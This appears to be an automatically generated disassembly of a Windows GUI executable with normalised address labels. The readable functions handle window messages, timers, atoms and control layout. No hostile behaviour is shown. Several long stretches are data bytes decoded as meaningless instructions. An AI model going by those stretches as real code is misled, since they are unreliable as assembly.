adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
int3
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
adc ch dl
inc edx
add [ eax ] bh
salc
inc edx
add [ ebp + edx * 8 - 0x297bffbe ] cl
sub_42d558
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
call sub_422498
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42d58c
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46f9ac
mov cl 0x1
sub_42d5b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034e8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d5ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d616
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d684
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_466388
mov [ ebp - 0x14 ] eax
call sub_4662a4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d747
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46f29c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42d719
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d720
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46f2f8
retn
sub_42d720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d74e
mov eax [ ebp - 0x14 ]
call sub_46643c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_4662ac
retn
sub_42d824
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408f64
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d96e
dec eax
add [ ecx + ebx * 8 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d9ca
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d9d1
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404b54
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42d9d4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dfc
call sub_42d824
mov eax [ r-xdata ]
call sub_417fe4
mov eax [ r-xdata ]
call sub_418084
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
sub_42da94
mov esp 0x60042e4
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xdaa49072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42da6072
add [ ecx + esi * 2 + 0x41 ] dl
add [ 0x78450800 ] al
je r-xdata
dec ecx
outsb
je r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x6c0042e8 ] al
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
fsub st2
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 + 0x42 ] al
add [ esp + ebx * 8 + 0x42 ] ah
add [ edx + eax ] ah
add [ eax ] al
or al [ fs : eax + eax - 0x20 ]
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
sub al 0x42
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add ah bl
0xed240042 0x44
insb
jae r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
inc edx
add [ ebp * 8 - 0x150fffbc ] ah
inc edx
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
inc ebp
add [ edi + ecx * 4 - 0x1523ffbf ] ch
popad
insb
cmp [ ebx + 0x41 ] bl
add [ eax ] bh
add [ eax ] al
jmp [ esp + 0x10042 ]
inc eax
add [ eax ] al
add bh bh
test ah ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
inc [ esp + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
call [ esp + 0x10042 ]
add [ eax ] al
add [ eax ] al
sub_42e34c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42e3f8
mov eax [ esi + 0x34 ]
call sub_422570
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42e384
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42e3be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e3f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42e477
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e47e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_42e4d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
in eax 0x42
add [ eax ] al
out 0x42 al
add [ edx + eax ] bl
add [ eax ] al
and al 0x3f
inc esp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov esp 0x6c0042e6
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
inc ebp
add [ ebp * 8 + 0x20480044 ] ah
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
push esp
mov [ eax + eax - 0x80 ] eax
inc bp
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
sub_42e570
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add al dh
test [ eax + eax - 0x58 ] al
sbb eax [ ebp ]
mov [ esi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ ebx + ecx * 4 + 0x44 ] al
add ah bl
xor [ ebp ] eax
pushfd
mov eax [ eax + eax - 0x74 ]
xor eax 0x35900045
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ ecx + ecx * 4 - 0x7547ffbc ] dh
inc esp
add [ ebx ] al
add [ ecx ] dl
mov ebp 0xffbaffbc
hlt
sub_42e638
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_448954
mov edx edi
mov eax [ esi + 0x210 ]
call sub_418854
xor edx edx
mov eax edi
call sub_44f774
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44f9c8
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42ea68
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42e6bc
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_418b4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42e6f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42e759
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448c54
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42e75e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e784
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_455038
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_4034ac
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42e7c4
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_454e80
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_4034ac
pop edx
pop esi
pop ebx
retn
sub_42e7f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444f24
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42eaa0
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42e880
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42eb14
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_4032b0
mov eax [ esi + 0x210 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_457d78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42e8d0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_424408
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42ea59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_456054
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_44f774
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_44f258
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4189b0
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
sub_42ea68
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418a0c
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44f460
mov eax ebx
mov si 0xffeb
call sub_4034ac
sub_42eaa0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42ec18
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42eb14
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e638
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_418a98
call sub_4032b0
pop edi
pop esi
pop ebx
retn
sub_42eb54
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42e8d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42eb8c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4189b0
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4189b0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42ec18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ece1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42eb14
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42e8d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ece8
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4189b0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4189b0
pop edx
call sub_44f884
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42ecf0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_455540
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4189b0
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42ed64
out 0x48 al
add [ edi ] ah
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] ch
out 0x48 al
add [ esi ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] dl
out 0x48 al
add [ esi ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] bl
out 0x48 al
add [ esi ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] al
out 0x48 al
add [ esi ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
out 0x48 al
add [ 0x640000ff ] cl
out 0x48 al
add [ esi ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + 0x48 ] ah
add al dh
inc [ eax ]
add [ esi + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x48 ] ah
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah bl
leave
dec eax
add ah dl
out dx al
inc edx
add ah dl
leave
dec eax
add ah cl
out dx al
inc edx
add ah cl
leave
dec eax
add ah al
out dx al
inc edx
add ah al
leave
dec eax
add [ esi + ebp * 8 - 0x3643ffbe ] bh
dec eax
add [ esi + ebp * 8 - 0x364bffbe ] dh
dec eax
add [ esi + ebp * 8 - 0x3653ffbe ] ch
dec eax
add [ esi + ebp * 8 - 0x365bffbe ] ah
dec eax
add [ esi + ebp * 8 - 0x3663ffbe ] bl
dec eax
add [ esi + ebp * 8 - 0x366bffbe ] dl
dec eax
add [ esi + ebp * 8 - 0x3673ffbe ] cl
dec eax
add [ esi + ebp * 8 - 0x367bffbe ] al
dec eax
add [ esi + ebp * 8 + 0x42 ] bh
add [ ecx + ecx * 8 + 0x48 ] bh
add [ esi + ebp * 8 + 0x42 ] dh
add [ ecx + ecx * 8 + 0x48 ] dh
add [ esi + ebp * 8 + 0x42 ] ch
add [ ecx + ecx * 8 + 0x48 ] ch
add [ esi + ebp * 8 + 0x42 ] ah
add [ ecx + ecx * 8 + 0x48 ] ah
add [ esi + ebp * 8 + 0x42 ] bl
add [ ecx + ecx * 8 + 0x48 ] bl
add [ esi + ebp * 8 + 0x42 ] dl
add [ ecx + ecx * 8 + 0x48 ] dl
add [ esi + ebp * 8 + 0x42 ] cl
add [ ecx + ecx * 8 + 0x48 ] cl
add [ esi + ebp * 8 + 0x42 ] al
add [ ecx + ecx * 8 + 0x48 ] al
add [ esi + ebp * 8 ] bh
inc edx
add [ ecx + ecx * 8 ] bh
dec eax
add [ esi + ebp * 8 ] dh
inc edx
add [ ecx + ecx * 8 ] dh
dec eax
add [ esi + ebp * 8 ] ch
inc edx
add [ ecx + ecx * 8 ] ch
dec eax
add [ esi + ebp * 8 ] ah
inc edx
add [ ecx + ecx * 8 ] ah
dec eax
add [ esi + ebp * 8 ] bl
inc edx
add [ ecx + ecx * 8 ] bl
dec eax
add [ esi + ebp * 8 ] dl
inc edx
add [ ecx + ecx * 8 ] dl
dec eax
add [ esi + ebp * 8 ] cl
inc edx
add [ ecx + ecx * 8 ] cl
dec eax
add [ esi + ebp * 8 ] al
inc edx
add [ ecx + ecx * 8 ] al
dec eax
add ah bh
in eax dx
inc edx
add ah bh
enter 0x48 0xf4
in eax dx
inc edx
add ah dh
enter 0x48 0xec
in eax dx
inc edx
add ah ch
enter 0x48 0xe4
in eax dx
inc edx
add ah ah
enter 0x48 0xdc
in eax dx
inc edx
add ah bl
enter 0x48 0xd4
in eax dx
inc edx
add ah dl
enter 0x48 0xcc
in eax dx
inc edx
add ah cl
enter 0x48 0xc4
in eax dx
inc edx
add ah al
enter 0x48 0xbc
in eax dx
inc edx
add [ eax + ecx * 8 - 0x124bffb8 ] bh
inc edx
add [ eax + ecx * 8 - 0x1253ffb8 ] dh
inc edx
add [ eax + ecx * 8 - 0x125bffb8 ] ch
inc edx
add [ eax + ecx * 8 - 0x1263ffb8 ] ah
inc edx
add [ eax + ecx * 8 - 0x126bffb8 ] bl
inc edx
add [ eax + ecx * 8 - 0x1273ffb8 ] dl
inc edx
